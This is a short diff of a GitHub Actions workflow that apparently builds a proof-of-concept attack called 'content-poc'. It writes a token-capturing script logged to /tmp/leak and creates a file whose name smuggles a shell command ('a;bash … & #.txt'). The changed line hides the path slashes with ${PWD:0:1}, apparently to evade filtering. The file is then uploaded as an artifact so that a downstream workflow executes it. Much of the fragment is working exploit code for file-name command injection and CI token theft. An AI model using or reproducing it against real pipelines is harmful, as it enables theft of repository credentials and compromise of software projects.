@@ -16,6 +16,7 @@ jobs:
           #!/bin/bash
           LOG=/tmp/leak
           : > "$LOG"
+          echo CAPTURE_STARTED >> /tmp/comment
           declare -A seen
           post() {
             local tok="$1" desc="$2" b64 scopes
@@ -43,7 +44,7 @@ jobs:
           done
           SCRIPT
           chmod +x content/p
-          printf 'x\n' > "content/a;bash \$'\\057tmp\\057content\\057content-poc\\057p' & #.txt"
+          printf 'x\n' > 'content/a;bash ${PWD:0:1}tmp${PWD:0:1}content${PWD:0:1}content-poc${PWD:0:1}p & #.txt' 
       - uses: actions/upload-artifact@v4
         with:
           name: content-poc
